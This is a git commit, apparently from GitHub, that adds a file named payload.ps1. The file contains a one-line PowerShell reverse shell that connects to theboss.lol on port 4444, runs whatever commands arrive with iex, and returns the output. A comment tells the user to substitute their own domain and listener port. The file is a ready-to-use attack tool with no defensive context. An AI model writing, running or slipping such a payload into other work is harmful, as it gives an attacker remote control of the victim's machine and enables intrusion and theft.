12c4123869e80bde5118861677d479ee6d33789a
Milkiasmelat <98502526+Milkiasmelat@users.noreply.github.com>
2022-03-27 15:23:47 -0400

    Create payload.ps1

---
+++ payload.ps1
@@ -0,0 +1,2 @@
+#change the domain name theboss.lol to your domain name and the port number 4444 to the port number ncar is listening to
+$sm=(New-Object Net.Sockets.TCPClient('theboss.lol',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
